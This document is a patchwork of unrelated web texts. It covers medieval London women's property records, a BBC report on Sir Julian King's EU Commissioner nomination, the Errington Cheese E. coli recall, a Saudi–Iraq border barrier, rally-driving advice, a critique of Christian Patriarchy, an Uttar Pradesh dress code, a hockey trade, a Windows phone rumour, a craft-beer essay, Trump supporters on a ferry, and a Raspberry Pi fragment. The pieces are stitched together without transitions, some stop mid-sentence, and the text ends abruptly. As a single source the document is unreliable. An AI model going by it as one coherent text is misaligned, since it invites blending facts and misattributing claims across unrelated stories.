Gunnora – Along with her husband Richard Hagyn and several other people, she was arrested and convicted of assaulting the Night Watch in 1304. She and the others were fined 8d each for damages; “and for breaking the peace at night-time to the terror of the neighbours and the scandal of the City they were sent to prison.”
Dyonisia – Dyonisia and her husband William le Bret of Wyntringham owned a house and quay in Castle Baynard in the year 1300
Felicia – Felicia, daughter of Hughelyng, was a poulterer. In 1306 she was accused of stealing 51 pigeons, 7 hens, 6 capons, 8 pullets, and two and a half hundred of eggs and 5 cheeses. She was acquitted.
Wymarka – In 1285, William de Aumondesham, tailor, gave in his will a shop to his daughter Wymarka and her husband Robert de Stauntone.
Isolda – Isolda was the wife of Richard Bussy. In his will from 1315 he gave her his home in the parish of St. Andrew de Holebourne and his brewhouse at the corner of Faytoreslane.
Leticia – Leticia la aylere paid 8 shillings, 4 pence in Lay Subsidy of 1292.
Diamanda – In his will from 1349 Thomas de Banham gave his daughter Diamanda his shops in Fletestrete.

Image copyright Foreign Office Image caption Sir Julian King has worked for the diplomatic service for 30 years
Britain's ambassador to France has been nominated to be the UK's next and potentially last European Commissioner.
Sir Julian King has been put forward by David Cameron following last week's resignation of Lord Hill in the wake of the UK's vote to leave the EU.
Sir Julian, a career civil servant, will be interviewed by officials and MEPs before being offered the role.
Lord Hill was in charge of financial services but that job has now been given to Latvia's Valdis Dombrovskis.
The BBC understands that the new British commissioner is likely to be given a "less sensitive" post, potentially covering the environment.
The diplomat would take up his post at a time when the UK's relations with the EU are at an all-time low following the decision to end its 43-year membership of the organisation, previously known as the European Community.
Sir Julian is to be interviewed by EU Commission president Jean-Claude Juncker on Monday to assess his suitability for the post and will later face a "confirmation hearing" in front of the European Parliament.
Analysis by Damian Grammaticas, the BBC's Europe correspondent
Image copyright AFP Image caption David Cameron's nomination could be influential in how Brexit talks are conducted over the next few years
Sir Julian King will, if accepted by the EU, fill an extremely delicate but highly influential position. The British Commissioner is the UK's most senior figure inside the EU institutions. A Commissioner does not represent their country, but he will be the eyes and ears of the UK, with a seat at the table as EU policy is drafted.
Crucially David Cameron's choice is not a politician, but one of the UK's most senior diplomats. Sir Julian King is currently ambassador to Paris. He knows the EU intimately. He's already filled three different diplomatic roles in Brussels.
He could face tough questioning in the European Parliament too before he can be confirmed. And it's not clear if Mr Juncker will give Sir Julian as high profile a portfolio as his predecessor Lord Jonathan Hill, who oversaw financial services in the EU but resigned following the referendum. Instead the UK's new Commissioner may get a less sensitive area such as environmental policy.
But having Sir Julian's experience in Brussels may prove crucial during future negotiations. French politicians have already indicated that the City of London will face tough conditions if the UK wants to enjoy its current level of access to Europe's Single Market.
According to the European Commission, new commissioners "shall be chosen on the grounds of their general competence and European commitment from persons whose independence is beyond doubt".
The approval of the European Council - made up of the 28 member states - is required before the appointment takes effect, while the Commission is also expected to "seriously consider" the opinion of the European Parliament.
If he is approved, Sir Julian will become one of the 28 top officials at the European Commission, the EU's executive arm. He would be expected to play an important role as a "conduit" between the UK and the other 27 member states during the talks over the UK's exit.
The UK remains a full member of the EU until it leaves, although it will not take part in all European Council meetings.
Mr Cameron has said it is up to the next prime minister, who will be elected in September, to decide when to trigger official exit talks - which, according to EU rules, should take two years although there remains controversy over the as yet untested Article 50 process.
Sir Julian only took up his current post in Paris in February. During a 30-year career in the diplomatic service, he held a number of senior positions in Brussels, including acting as a senior aide to a previous EU commissioner.
Previous UK commissioners have included high-profile political figures such as Lord Patten, Lord Kinnock and Lord Mandelson.

The family that produces the gourmet cheese at the centre of fresh concerns over a fatal E. coli outbreak say they will be made bankrupt after a food watchdog confirmed all its produce is to be destroyed.
Investigators confirmed that their probe has now been widened after two more people were identified as being infected bring the number who were ill to 22, of which 13 have needed hospital treatment.
They are also examining whether cases of E. coli O157 infection affecting children in the Angus area may also be linked.
Food Standards Scotland (FSS) on Wednesday issued a blanket ban on the sale of all cheese from Errington Cheese, of Carnwath, South Lanarkshire, the producer linked to the outbreak which led to the death of a three-year-old Dunbartonshire girl.
FSS explained for the first time details of tests during the seven-week long alert.
It confirmed E. coli non-O157 was detected in one sample of Dunsyre Blue produced by Lanarkshire-based Errington Cheese which is considered a “serious risk to public health”.
It said 13 samples in different batches of Errington's Dunsyre Blue and one of Lanark White have tested “presumptive positive” for shiga toxin producing E .coli and are considered to be “potentially hazardous to health”.
While E. coli O157 was detected in one sample of Lanark White cheese it was not shown to contain stx genes which were found in people who were ill. However a food examiner declared it was “potentially injurious to health and/or unfit for human consumption”.
All positive tests were still awaiting “further confirmatory testing”. It was not clear when the testing took place.
A multi-agency Incident Management Team (IMT), that includes Health Protection Scotland and Food Standards Scotland's Scottish arm has been reconvened to deal with the latest developments.
Ten days ago the IMT had declared the outbreak to be “over” and that it had stood down leaving the FSS working with South Lanarkshire Council to continue food safety investigation.
And Professor Hugh Pennington, an expert on E.coli has questioned the proportionality of the food watchdog's decision to issue a blanket ban on the sale of all cheeses from Errington.
The emeritus professor of bacteriology at the University of Aberdeen, said FSS had come down “very heavily” on Errington Cheese, stating there is a “real possibility” the organisation was “over-interpreting scientific evidence.”
He said that the “jury was still out” and while there may be a “moderately strong” case on Dunsyre Blue, there was “no scientific evidence” on any of the firm's other cheeses.
Humphrey Errington, owner of Errington Cheese insisted there is no evidence linking his cheese to the outbreak insisting investigators will not talk to them about the proof for the sales ban.
FSS deny this, saying all all results from samples were shared with Errington and insist decision take to recall Errington Cheese Ltd products are “evidence-based and informed by interpretation from experts including legally designated food examiners”.
“They have destroyed us, basically. We are completely finished,” said Mr Errington. “It's a nightmare. Unfortunately, nightmares are things you wake up from.
“They are destroying cheese to the value of £300,000, there is no company of our size that can survive that. “Our reputation is completely destroyed and the family will be bankrupt.
FSS said: “Potentially harmful strains of E.coli and the shiga toxin (stx) genes that can cause illness in humans have been found in a number of different batches of different cheeses produced by Errington Cheese Ltd.
“This means that FSS is not satisfied that the controls and production methods used by the business are producing safe food. Furthermore, the reliance on a limited number of negative test results as evidence that the food is safe provides insufficient assurance.
“Throughout this incident FSS has taken a proportionate approach based on the evidence and it considers that the evidence now
IMT chairman Dr Alison Smith-Palmer said that the IMT has established that 19 of the 22 confirmed cases had eaten blue cheese prior to becoming ill.
Of these, 15 are known to have eaten Dunsyre Blue while others cannot be certain about the brand of blue cheese they have consumed. Investigations are ongoing on the other cases.
Food Standards Scotland stated that on 14 September 2016 Food Standards Scotland (FSS) issued a food alert for action (FAFA) for all products produced by Errington Cheese Ltd. That decision was not taken lightly. FSS is fully aware of the impact on the business, but its priority is to protect public health.
FSS's primary focus is protection of consumers. FSS has made information available where this has been in the public interest, but it would not be appropriate to conduct an ongoing food safety investigation through the media.
The recent outbreak of E. coli O157 has now affected 22 people, 13 of whom have required hospitalisation, and tragically, one child died as a consequence. The multi-agency Incident Management Team (IMT) chaired by Health Protection Scotland concluded that, based on strong epidemiological evidence, the outbreak of illness in humans was linked to Dunsyre Blue cheese, produced by Errington Cheese Ltd. Of the 22 confirmed cases to date, the IMT has established that 19 had eaten blue cheese prior to becoming ill. Of these, 15 are known to have eaten Dunsyre Blue while others cannot be certain about the brand of blue cheese they consumed. Investigations are ongoing on the other cases.
Since the outbreak was declared over on 5 September 2016, two new cases have been identified with the same outbreak strain of E. coli O157 and the IMT has consequently reconvened.
Errington Cheese Ltd. has undertaken two voluntary recalls of cheese, and Food Standards Scotland has initiated two further recalls – on 10 and 14 September 2016.
The FSS recalls have been initiated on the basis of evidence available to FSS and South Lanarkshire Council (SLC) as a result of sampling and testing of cheese produced by Errington Cheese Ltd and concerns regarding its Food Safety Management System and its ability to produce safe products, and in view of the new epidemiological information available concerning the two new cases.
Errington Cheese Ltd has publically commented that E. coli O157 has not been found in its cheese. This is inaccurate. Some samples submitted for testing by SLC have tested positive for E. coli O157 and for another (non-O157) strain of E. coli. These organisms are considered a serious risk to public health by the Food Examiner and the Scottish E.coli O157/VTEC reference laboratory. In addition, further samples have tested positive for shiga toxin (stx) genes. These samples have tested “presumptive positive” for shiga toxin producing E. coli (STEC) and therefore are considered to be potentially hazardous to health.
Analysis of samples taken by SLC has been carried out using accredited methods in official laboratories. All results from these samples were shared with Errington Cheese Ltd as soon as they were available. The decisions FSS has taken to recall Errington Cheese Ltd products are evidence-based and informed by interpretation from experts including legally designated Food Examiners.
coli O157 and non-O157 have been detected in different batches of Dunsyre Blue and Lanark White produced by Errington Cheese Ltd. Batch numbers relate to the dates the batches were produced.
Batch F15 Dunsyre Blue: Shiga toxin producing E. coli (STEC) has been cultured and isolated from a sample taken from batch F15 (Dunsyre Blue). This sample has been confirmed as a non-O157 E. coli (STEC). This type of E. coli has been known to cause severe illness. Nine further samples were subsequently taken from this batch, and all have also been found to contain the stx2 gene and one for the stx1 gene (all nine samples are therefore considered presumptive positive for STEC), FSS is awaiting further confirmatory testing on these samples. This product has not been placed on the market.
Batch G14 Lanark White: E. coli O157 has been cultured and isolated from a sample taken from batch G14 (Lanark White). This isolates has not been shown to contain the stx genes and is undergoing further analysis. Stx gene negative strains of E. coli O157 have been isolated from cases of human illness consistent with E. coli O157 infection.The Food Examiner declared this sample to be “potentially injurious to health and/or unfit for human consumption”. Therefore this batch was withdrawn by FSS following the refusal of the food business to withdraw it voluntarily.
Batch E24 Dunsyre Blue: two samples from batch E24 (Dunsyre Blue) have been found to contain the stx2 gene – these samples would therefore be considered as presumptive positives for STEC whilst FSS awaits further confirmatory testing. This batch was withdrawn voluntarily by the food business.
Batch G12 Dunsyre Blue: a sample from batch G12 (Dunsyre Blue) has been found to contain the stx2 gene (a presumptive positive for STEC) and FSS is awaiting further confirmatory testing on this sample. This product has not been placed on the market
Batch H24 Lanark White: A sample from batch H24 (Lanark White) has been found to contain the stx2 gene. This sample would be considered a presumptive positive for STEC whilst FSS awaits confirmatory testing.This product has not been placed on the market.
Potentially harmful strains of E.coli and the shiga toxin (stx) genes that can cause illness in humans have been found in a number of different batches of different cheeses produced by Errington Cheese Ltd. This means that FSS is not satisfied that the controls and production methods used by the business are producing safe food. Furthermore, the reliance on a limited number of negative test results as evidence that the food is safe provides insufficient assurance, as it is clear that multiple samples across different cheese batches have had positive results.
Throughout this incident FSS has taken a proportionate approach based on the evidence and it considers that the evidence now justifies a full recall of Errington Cheese Ltd. products to ensure the protection of public health. FSS has been in frequent communication with Errington Cheese Ltd. throughout these investigations both directly, through SLC and through the company's legal representatives.
From the point of issue of the FAFA, all Local Authorities in Scotland will be seeking to ensure all products manufactured by ECL are recalled and held with a view to being destroyed. If consumers have any products from Errington Cheese Ltd. they should dispose of them or take them back to the place of purchase. ‎
The Saudi–Iraq border stretches from Turaif near the Jordanian border in the West to Hafar Al-Batin near the Kuwaiti border in the East. It is 814 km long. The most important border crossing is situated North-East from Arar.
Barrier [ edit ]
In April 2006, while Iraq was experiencing a high level of sectarian violence, Saudi Arabia began to call for tenders to construct a border barrier in the form of a fence along the border in an attempt to prevent the violence in Iraq spilling over into Saudi Arabia.[1]
The proposed fence would run for approximately 900 kilometres (560 mi) along Saudi Arabia's isolated northern desert border with Iraq. It was part of a larger package of fence-building to secure all of the Kingdom of Saudi Arabia's 6,500 kilometers of border. It would supplement the existing 7-meter-high sand berm that runs along the border, in front of which there is an 8-kilometer stretch of no-mans-land which is regularly swept smooth so that trespassers can be tracked.[2]
The proposals were not implemented until September 2014, when the Iraq War had escalated following the rise of the Islamic State of Iraq and the Levant. ISIL's occupation of much of western Iraq had given it a substantial land border with Saudi Arabia to the south, and the barrier is intended to keep ISIL militants from entering Saudi Arabia.[3]
The line consists of a multi-layered fence and ditch barrier wall. The border zone includes five layers of fencing with includes 78 monitoring watch towers, night-vision cameras, and radar cameras, eight command centres, 10 mobile surveillance vehicles, 32 rapid-response centres, and three rapid intervention squads.[4][5]
The barrier is sometimes referred to as the Great Wall of Saudi Arabia.[6] The works are done by Airbus, formerly EADS.

Not only is it the smart bet, but it's a much better long bet. I promise!
Here are 5 reasons for starting with rally in a cheap stock 2WD car:
#5. Rally is awesome, but you just don't know how awesome yet.
I started my first rally thinking “I know what's going to happen. I know what's important!” When we barely finished a one day regional rally I had a completely different set of priorities. Stuff that was super important the day before no longer mattered and stuff that I didn't even think about was now at the top of the list. Now what if that first list of stuff took twice as long to complete? What if I thought engine dyno time and brake bias was more important than just getting on the stages at my first event? Some people never make it to the start line for this very reason.
#4. Everyone loves the underdog, and it's great to BE the underdog.
An easy excuse is: “The car is slow.” A better excuse is: “I am slow.” You will go out there and get beat by 10+ cars. Now you can do this in a $8,000 beater P-Car you spent 6 months prepping or a $80,000 AWD special you spent all of last year saving for. Let me tell you though – when you start beating much faster, much more expensive hardware – it feels great!
#3. A bone stock 2WD rally car is easily 1/10th the cost.
You think you'll have money for this – but your girlfriend has other plans. 😉 You're going to want to move out of that shitty apartment and your promotion won't come fast enough. You think you'll catch the eye of some big sponsors, but don't set yourself up to fail. Rally costs real money, and really fast (top of the championship) rally cars cost A LOT of money. Like a small house in Los Angeles kind of money. You might get some parts discounts, and free paint, but chasing sponsorships can be a full time job.
#2. You will be able to attend more events and get more experience.
How do you get better at something? Practice! Do you rally 6 TIMES with a $20,000 budget, or do you rally ONCE. The more seat time you get, the faster you will become. I know, I know, Subaru WRX rally cars ARE friggen awesome and it's totally cool to have one, but having one that does 3 rallies and then sits for 2 years is sad. 🙁 The more rallies you complete the better prepared you'll be for the next one. It's up to you, Underdog.
#1. You will become a much better driver. I promise!
You'll have to setup and commit to your braking zone and learn to squeeze every last drop of speed through the corner. You'll be controlling the throttle and left foot braking as you exit. These techniques are a lot easier to learn slowly on a cheap 2WD car than a super ‘on the edge' AWD monster. With 2WD you can't mess up a turn and then just stomp on the turbo to get you going again. Slow 2WD cars teach you to understand the preservation of motion. Don't worry, when you make a mistake and plow into the outside of the turn – it'll be a much less costly one.
“Until you finish a rally without lifting, you don't need a faster car.”
– Tim O'Neil
I know how tempting it is to build a balls-to-the-wall AWD turbo monster car for your first time out, but you must resist! Building a faster car in 2 years will be a lot better than not having enough money to rally in 2 years. See you on the stages! – Kris
The church is an environment of extremes. The trouble with extremes is that they always contain a seed of truth, making them look and sound plausible to the careless bystander. By virtue of this fact, the church is also often full of susceptible bystanders ready to lap-up the latest and greatest fad. One example of this is seen in the Christian Patriarchy movement. Popular now, for some thirty years, Christian Patriarchy, and its twin the "Quiver-full" movement , contain truths about headship, gender roles, and attitudes towards authority in the home. God has ordained such matters, but the question arises, what has God ordained concerning them?
This post does not seek to trash the patriarchy movement or those found in it. Neither does it disagree with the biblical truths concerning headship, gender roles and attitudes towards authority. Rather it seeks to identify a number of issues that do great harm to those within the movement specifically and Christ's Church as a whole. To be fair, not all in the Patriarchy movement hold to an identical set of beliefs and so I will, in this post, necessarily paint with a broad brush.
Christian patriarchy tends to supplant ecclesiastical authority. This is manifested when the local church's rightful role and authority is taught (either in word and deed or in function and practice) to be inferior of that of the patriarch of the family. Christian fathers may not usurp the rightful authority and function of the church. For instance, Christ has not entrusted to non-ordained men the public ministry of the word, the administration of the sacraments, church discipline etc. I have known of families, with patriarchal leanings, who determined that they had the right to trump ecclesiastical authority by refusing to allow the church to discipline their rebellious teenager. What the Patriarchy movement often fails to emphasize is that even the patriarch in the home is a man under authority in the church. It stands to reason that so is his family. Moreover, men in general are not the head of women in general. Biblical headship pertains only to the marriage relationship and the parent-child relationship. There are few things more dangerous than a failure to recognize and willingness to submit to the authority of the church. A failure to recognize the authority of the officers of a biblically faithful local church is a failure to recognize the authority of Christ, the Head of the Church. Christian Patriarchy tends to supplant ecclesiastical community. The Patriarchy movement has far too frequently produced a family that is separate from the local church, rather than a family that is a microcosm of the local church. This is, of course, a natural product of a misunderstanding the authority of the church. When this happens, family is elevated to a place of greater importance than the church. Yet, in Scripture the church is held in the highest esteem. After all, our Lord did not shed his blood for the family, but for the Church (Acts 20:28). Such a misunderstanding frequently produces socially stunted children, as well as carbon copies of "the patriarch" himself--that is, someone in a continuous power struggle with the church. In turn, this becomes the death-knell of evangelism in the church. Christian Patriarchy tends to pervert the father's God-given role in the home as prophet, priest and king. Anyone familiar with Scripture must agree that the spiritual head of the home certainly holds, in some way, these functions. They are not, however, ecclesiastical offices. Rather, they are parental functions. Acting as prophet, in the home, the father is to teach his family the Word of God. Acting as priest, he is to intercede in prayer on their behalf. Acting a king, he applies the law of God to his family and provides such direction as it is rightful. The problem with the patriarchy movement is that it interprets these functional roles as offices. Moreover, it often emphasizes the office of King over the other roles. In reaction, many have turned from these biblical functions and denied that heads of households should function these ways. In short, Patriarchy has damaged, rather than enhanced, true biblical headship. Christian Patriarchy tends to pervert the mother's God-given roles in the home. Can anyone who has read Scripture--or examined the workings of an average Christian home--deny the reality that the mother is also frequently acting as a prophet, priest and king of the home? The Proverbs frequently call the son to listen to the counsel of his father and his mother. Additionally, the law of God commands children to "Honor your father and you mother." It is the mother who teaches, intercedes for and rules and guides in the home for substantial portions of the day. Is the mother tied to the sink or oven or bed? No! She is a teacher, a counselor, a prayer-warrior, a master in the home, for and on behalf of her children. Does Christian Patriarchy pervert this model? It seems to do so in many cases. Christian Patriarchy tends to be a man-made, law-based system. There is a great danger for sinful men in a singularity of authority! Nowhere else do we accept it! In American government we have (in theory) a separation of powers, a system of checks and balances. In the legal world we have a series of appeals courts. In the ecclesiastical sphere, God has ordained a plurality of elders for the purpose of keeping authority out of the hands of one man. Patriarchy, ultimately, centers all authority in one man. In order for authority to function, there is need for rules and laws. My fear is that the singularity of authority found in patriarchy, not only creates a system of self-preserving laws (which tend to be man-made), but it also squeezes out the Gospel from daily life. Being most concerned about behavior modification proponents of the Patriarchy movement have often forgotten the real need for heart-modification, not by law, but by the grace of God in the Gospel.
It is simply a poor hermeneutic to find a detailed explanation of how we should live by examining the lives of Abraham and Job. Clearly there is much to learn from the Patriarchs; but they too were sinners (dare we say it, with, "multiple wives!") living in the shadows of the preparatory and anticipatory Old Testament era. Ecclesiology was not fully developed in the Patriarchal era. When seeking to develop a fully biblical ecclesiology, we have to ask what Peter, Paul and our Lord Jesus have to say about these things. After all, redemptive-history finds its fullness in the teaching of Jesus and the Apostles. As we read the New Testament, we find an absence of teaching on anything that remotely resembles most of the principles of the Patriarchy movement. If we want to be biblically faithful, we need to examine all the biblical data, regardless of whether it fits our presuppositions or not. We must be willing to have our presuppositions corrected by the Scriptures if we are to be the fathers and mothers God intends for us to be.

Lucknow: After putting a blanket ban on cigarettes and gutkha in government offices, Uttar Pradesh Chief Minister Yogi Adityanath has now reportedly directed the Directorate of Higher Education to ensure proper dress code for colleges across the state.
According to News18.com, a government directive, send to nearly 158 government colleges and 331 government-aided colleges in Uttar Pradesh, has asked teachers to dress up “modestly” and ''give up jeans and t-shirts.”
“All the faculty members and other university officials are requested to come in on time in modest clothing and perform their duties with responsibility. Jeans and T-shirts are prohibited while on duty,” said a circular issued on March 31 by the Directorate of Higher Education.
The circular carrying the signature of Urmila Singh, the joint director of higher education, says bio-metric systems will be installed in all government colleges to mark attendance and ensure timely and transparent working.
This move coincides with the Yogi Adityanath government's crackdown on smoking, and consumption of pan masala and gutkha in government offices, schools and colleges.
The reigning NHL Art Ross Trophy winner Martin St. Louis has been traded to the New York Rangers in exchange for Ryan Callahan, a first round pick in the 2015 NHL Draft and a second round pick in the 2014 NHL Draft. These picks do have some conditions attached however.
Since returning from winning gold with Canada at the Olympic Games in Sochi his name has been involved in rumours. There have been questions about the relationship between St. Louis and Steve Yzerman stemming from the formers exclusion from the original Team Canada roster.
Confirming Martin St-Louis is traded to the Rangers for Ryan Callahan. #lightning #tvasports — Renaud Lavoie (@LavoieRenaud) March 5, 2014
St. Louis has been a member of the Tampa Bay Lightning since 2000-2001, also spending a short period with the Calgary Flames to start his career. He has played 1041 NHL games, scoring 369 goals and 604 assists for 973 points. In that time has won two Art Ross trophies, a Hart Trophy as league MVP and a Stanley Cup.
This season Martin St. Louis has scored 29 goals and 32 assists for 61 points in 62 games. With Steven Stamkos going down to injury for a large portion of the season he has been the leader of a resilient Tampa Bay Lightning team. Stamkos is set to return at some point this week. He is signed through the end of the 2014-15 season with a cap hit of $5.625 million.
The 28-year-old Callahan is the Rangers captain and was part of the U.S. Olympic team in Sochi. He has 11 goals and 14 assists for 25 points this season, in 45 games. He is known for his gritty, hard-nosed, never say die style of play and his leadership.
Callahan was a 4th round pick (127th overall) of the Rangers in 2004. He has played his NHL entire career with New York appearing in seven full seasons with the team and parts of an eighth season. He has 132 goals and 122 assists for 252 career points in 450 career NHL games.
As for the conditions, if New York makes the Eastern Conference finals, the 2014 second round pick becomes a first round pick.
If Ryan Callahan re-signs with the Lightning, the 2015 first round pick moves to the second round, and the Lightning receive an additional 7th round pick from New York in 2015.

File this one under interesting but unlikely, WindowsUnited.de reports that according to their sources, German OEM Trekstor is poised to make a comeback into the Windows phone world – and they'll be partying like it's 2015.
The report alleges the former Windows phone OEM is pushing for mass production of a new Windows 10 Mobile phone in April.
The alleged Windows 10 Mobile powered device will come sporting a 2015 Snapdragon 617 and will be able to support continuum – probably.
There aren't any more details regarding design or expected screen quality.
If this rumor is accurate (and there's likely a grain of truth there somewhere), we're looking our for yet another Windows phone by a regional manufacturer sporting an outdated and underpowered processor.
Windows 10 Mobile hasn't had the best year, dipping to just above 0%. In addition, Microsoft has ceased making Windows 10 Mobile hardware, with its last device being the woefully underpowered Lumia 650 in 2016. As for third party Windows phones, all traditional Windows Phone OEMs like Nokia and Samsung have long since gone all in on Android, and even the new generation of WP OEMs like Vaio and Trinity ditching their Windows phones for Android models.
For a desperate Windows fan who won't use anything other than Microsoft's software, Trekstor might just be an option.
Excited about a potential new Windows phone in 2017? Let us know in the comments below.
Among the 5,000 or so breweries in the country, a handful of us tend to gravitate toward one another's beers, philosophies, and ways of life. Some of my most fond industry-centered memories involve Walt. I never found him very mysterious: his shaggy hair and tall thin body always seemed to fall and stand in a way that exuded his current mood. Walt keeps it real.
Many of us look forward to the few times a year that we see each other at festivals and conventions around the country. Social media allows most of us to stay connected, see what the others are up to, and ultimately what their breweries are doing, releasing, and working on. But at these special gatherings, we often have an opportunity within our hectic schedules to be friends. We share knowledge, we share laughs, and we challenge each other to make the best beers that we can because we're all so damn passionate about what we do.
Like everyone else, I saw the news on Wednesday morning. I had to re-read the email. This news was big. I thought of the ramifications, the uproar, and the hurt that so many would feel— including those at Wicked Weed who were no doubt braced for the backlash. I was worried. Immediately, I picked up my phone and texted him, "Homie! I'm happy for you, man!" And I was.
We've all seen how these things go down, and many of us wonder what we'd ever do in a moment like that—how we'd handle the pressure.
I also felt for the drinkers. It is quite reasonable to be upset by Wicked Weed's departure from independence. For most that supported and loved Wicked Weed, it feels like a betrayal. By investing in their brands and being loyal to that company the consumers built them into the powerhouse that they are, essentially putting them in a position to even be considered for purchase. Most of us can't even imagine being that successful. Every dollar spent at Wicked Weed, for some drinkers, was a little way of "sticking it to the man," and now that dollar is owned by the man! I can understand the outrage.
Most of us in the craft sector consider ABI a threat. Wicked Weed is the 10th U.S. craft brewery to sell to them, but for some reason, this one really stings. Among our "like-minded breweries" are "like-minded drinkers”—this engaged, obsessive group of craft drinkers (like us!) that understand what a Grisette is, or the difference between Gueuze and Gose. This is the crowd that we see at some of our favorite events and with whom we feel a kinship. Things like Yazoo's Funk Fest (happening right now!), and Wicked Weed's Funk Asheville.
Wicked Weed, even among this ambitious group, is a phenomenon. I have never seen a brewery grow as quickly as they have while maintaining and increasing quality along the way, especially considering the wide breadth of styles they produce. It has been impressive (and, honestly, frustrating) to watch. Wicked Weed has become the pinnacle for some of us, and ABI took them away. We were in shock, and it took a few hours to digest. It felt like we were all holding our breath waiting for someone to make the first statement. And then came Jeff.
My respect and admiration for Jeffrey Stuffings is well documented. Jester King is one of my favorite breweries in the world. The word that comes to mind, when I try and describe why they are so special to me, is "authenticity." In everything they do, Jeff and the Jester King crew remain true to themselves. Whether it be their beers, their property, their brewery, their process, their values, their fight against injustice and inequality, their incredible integrity, or their transparency, it all resonates with me like it does with so many of their fans. In his very direct and tasteful way, Jeffrey stepped forward and, I imagine, with a lump in his throat, publicly distanced his business from Wicked Weed.
Damn.
This was the first real blow. I read Jeff's post a few times over and I could feel the hurt. I know how much Jeffrey respects and admires Walt, and I know how much Walt loves Jeff and Jester King. But Jeff's hands were tied. I mean, hell, his brewery's name is "Jester" and "King," for crying out loud. The man's mission statement might as well be "Suck it, ABI." Much like when I saw the news of Wicked Weed selling to ABI, when I saw Jester King's official post on the matter, I wondered about Jeffrey, about my friend, and what I knew was an extremely difficult decision for him to make. Again, I picked up my phone and, after exchanging a few texts I told him that, "I think you did the right thing for yourself and your brewery." And I meant it.

It's the evening rush on the Staten Island Ferry, and Donald Trump's New Yorkers, spent after a day's work in Manhattan, are heading home.
There's the construction worker who is convinced Trump will stop “pussyfooting around” when it comes to terrorism. There's the Hungarian immigrant tow-truck driver who says Trump speaks his language. There's the moving-company worker who believes Trump would be the first honest and courageous president in his lifetime, the diamond dealer who respects his toughness and the fashion model in awe of his glamour.
“He's just the man, right?” says Jimmy Dawson, 20, just back from modeling Givenchy's new line on a runway in Paris. On the ferry, Dawson looks incognito, save for his red “Make America Great Again” cap.
“It's his wealth, his attitude,” he adds. “Look at what he's done. It's inspiring. Who wouldn't want to have that life? Who doesn't want to be rich? This is New York.”
This is Trump's city, and these are his people. The billionaire real estate mogul is poised to wallop his opponents in Tuesday's New York primary and record one of the biggest victory margins of the GOP presidential race so far. Recent polls show Trump topping 50 percent in the state, far outpacing Ohio Gov. John Kasich and Sen. Ted Cruz of Texas.

To understand why, listen to passengers on the ferry as it cruises across New York Harbor. They see Trump as the human embodiment of their city's spirit and ambition. He's big and brash and unafraid.
They say they know Trump and believe in him, even though they've never met him. For decades, they've been reading about his exploits in the tabloids, staring up at his buildings, spotting his name practically everywhere.

“He's a New Yorker, you know?” says Frank Manzo, 51, who works for a commercial moving company. “He's bold in some ways and he's honest.”
Manzo says he worries about terrorism. It's everywhere, he says: “Everybody rolls all over us because we're not tough. They take our hostages and torture us. If somebody's going to come in here and bomb this ferry, there should be consequences. Trump will stop it.”
That's what Margaret Power believes, too. “Trump is very tough, real hard, and that's what we need,” she says. “It's time to stop pussy-footing around.”

Power is 52 and works in construction. She's currently building the set for a fashion exhibit at the Metropolitan Museum of Art. She says she trusts Trump because he's not like the other politicians, beholden to their donors. “He's steering himself,” she says.
“He's done a lot for New York City,” Power adds. “He's involved in great projects. He's a stand-up guy. Great quality. He's done more than most mayors, and it shows.”
Joe Berardi envisions Trump as a jobs president. “He'll be good for guys like me,” the 33-year-old construction worker says as he finishes off a slice of pizza.
Berardi wakes up at 3 a.m., arrives at his work site by 7 and rides the 5 p.m. ferry home to Staten Island, day in and day out, six days a week. He usually works on skyscrapers, but these days he's helping build a Niketown on Broadway.
“Donald Trump is a real estate genius, you know?” he says. “It's not that a billionaire is going to care about me, but as a group, he knows he needs us guys. If he gets rid of all that cheap illegal­immigrant labor, who's left to do the jobs? Guys like me.”

Josh Shimoni, 65, has the same hope.
“Trump! Trump! Trump! He's talking my language,” says Shimoni, a tow-truck driver who immigrated to the United States from Hungary at age 22. “He understands our frustration in business, and I think he can help. Business is very, very bad. There's no work. And he'll make the system work again.”
There are plenty of Trump haters in New York, no doubt millions of them. Scores are on this ferry — women, blacks, Latinos, millennials. Some laugh when asked whether they plan to vote for Trump.
“I don't like him,” says Chris Topherbollinger, a middle-aged white man decked out in Yankees garb. “Actually, I despise him.”
But others think Trump is just what America needs, what Staten Island needs. Of New York City's five boroughs, this is the forgotten one. It's cut off from the subway system and accessible only by boat or bridge. It's the least populous borough — home to just fewer than 500,000 people — but also the whitest and most Republican. Trump is scheduled to campaign there Sunday.
As in so many other places across the country, an influx of immigrants on Staten Island has stoked tensions. Debbie Padovano, 59, voted for President Obama but is on the Trump train now. She lives in Manhattan but commutes to Staten Island to work at a food pantry for the homeless. She says she encounters the immigration problem every day at her work.
“They don't have the right credentials,” she says. “We take them in — and some of them, I'm glad. But there are just so many of them. They're taking people's jobs. . . . I think Donald Trump will fix it.”
Padovano says she recoils from Trump's inflammatory rhetoric and hopes he will “curb his discrimination.” Nevertheless, she has been persuaded that he's up to the task.
“Once he has it in his hands, he'll know exactly what to do,” Padovano says. “I know he can handle the job. I really do. There's only one I listen to. . . . Donald — excuse me, Mr. Trump — would diminish Congress and take control.”
Taking control is what Michael O'Brian, 52, wants the next president to do, and he thinks Trump is the one to do it.
“When [Islamic State terrorists] bombed France, his first reaction was, ‘I'm going to bomb the sh-- out of them.' I like the way he thinks. He's got courage,” O'Brian says.
[These are the towns that love Donald Trump]
O'Brian lives a hard life. He says he used to build scenery at the Metropolitan Opera but fell off a ladder a few years back, knocked out his teeth and broke his back in three places. He says he can't work anymore. He walks with a cane and, on this evening, stands in the windy doorway of the ferry looking out at the Statue of Liberty as it passes by.
O'Brian is not one of those Trump backers who applaud everything that comes out of the candidate's mouth. When Trump recently said women who have abortions should be punished, “I wanted to punch him in the face,” O'Brian says.
But, he adds, “he's a New Yorker. He speaks his mind.”
[Video: Moments from the Trump family town hall]
This is the kind of attitude that drew Chris Szymanski to support Trump. A Polish immigrant, Szymanski, 62, lives on Staten Island and sells diamonds in midtown Manhattan. He says he wants a strong, almost authoritarian leader. Riding home on the ferry in a suit and tie, flipping through a newspaper, Szymanski compares Trump to Russia's president.
“There are two men I respect in this world: Vladimir Putin and Donald Trump,” he says. “They are strong leaders with big follow-up. They solve problems. They have a strong mind, resolution, character.”
Szymanski explains what he considers New York values: “Strong, dynamic, confident and patriotic.” He says Trump embodies them all and is the solution to what ails the country.
“He will fix it all,” he says. “Look at what he did in his life. Look at his kids, his empire. Don't you see a pattern? Quality. Honesty. Resolution. Success.”
Image caption The Pi snapped pictures almost 40km above the Earth
A Raspberry Pi computer has boldly gone where no other Pi has gone before.
